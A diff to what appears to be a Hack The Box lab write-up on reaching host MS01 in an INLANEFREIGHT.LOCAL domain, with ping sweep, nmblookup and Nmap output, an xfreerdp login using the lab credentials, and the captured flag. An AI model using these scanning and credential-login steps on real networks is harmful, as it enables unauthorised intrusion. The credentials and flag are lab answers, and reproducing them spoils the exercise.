@@ -85,7 +85,7 @@ Time.Estimated...: Fri Mar 28 07:46:37 2025 (0 secs)
 ```
 3-  **Submit the contents of the C:\flag.txt file on MS01.**
 
-To determine other live hosts on the network, I ran a ping sweep:
+To discover active hosts on the network, I performed a ping sweep:
 
 ```c
 ┌─[htb-student@skills-par01]─[~]
@@ -95,7 +95,10 @@ To determine other live hosts on the network, I ran a ping sweep:
 64 bytes from 172.16.7.60: icmp_seq=1 ttl=128 time=0.601 ms
 64 bytes from 172.16.7.240: icmp_seq=1 ttl=64 time=0.076 ms
 ```
-I then used nmblookup on each of the live hosts found to determine which one was MS01:
+This revealed four active hosts on the 172.16.7.0/24 network.
+
+I used nmblookup to determine which host corresponds to MS01:
+
 
 ```c
 ┌─[htb-student@skills-par01]─[~]
@@ -108,38 +111,53 @@ Looking up status of 172.16.7.50
 	MAC Address = 00-50-56-B0-61-67
 ```
 
+Next, I ran an Nmap scan to identify open ports and services:
+
 ```c
-─[✗]─[htb-student@skills-par01]─[~]
-└──╼ $nmap -sC -sV 172.16.7.3
-Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-27 14:34 EDT
-Nmap scan report for inlanefreight.local (172.16.7.3)
-Host is up (0.037s latency).
-Not shown: 989 closed tcp ports (conn-refused)
+┌─[htb-student@skills-par01]─[~]
+└──╼ $nmap -sC -sV 172.16.7.50
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-28 08:59 EDT
+Nmap scan report for 172.16.7.50
+Host is up (0.035s latency).
+Not shown: 996 closed tcp ports (conn-refused)
 PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-27 18:34:31Z)
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
 445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped
-Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
+| Not valid before: 2025-03-27T11:38:37
+|_Not valid after:  2025-09-26T11:38:37
+|_ssl-date: 2025-03-28T12:59:58+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: INLANEFREIGHT
+|   NetBIOS_Domain_Name: INLANEFREIGHT
+|   NetBIOS_Computer_Name: MS01
+|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
+|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
+|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-03-28T12:59:53+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
+| smb2-time: 
+|   date: 2025-03-28T12:59:53
+|_  start_date: N/A
 | smb2-security-mode: 
 |   3.1.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2025-03-27T18:34:32
-|_  start_date: N/A
-|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:da:38 (VMware)
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:61:67 (VMware)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
-┌─[htb-student@skills-par01]─[~]
+Nmap done: 1 IP address (1 host up) scanned in 25.86 seconds
 ```
+The presence of RDP (Remote Desktop Protocol) on port 3389 indicates a potential method of access.
 
+
+Using the identified credentials, I initiated an RDP session to the MS01 host:
+
+```c
+xfreerdp /u:AB920  /p:weasal /d:INLANEFREIGHT.LOCAL  /v:172.16.7.50
+```
+Once connected, I navigated to  C:\ and successfully retrieved the flag: aud1t_gr0up_m3mbersh1ps!
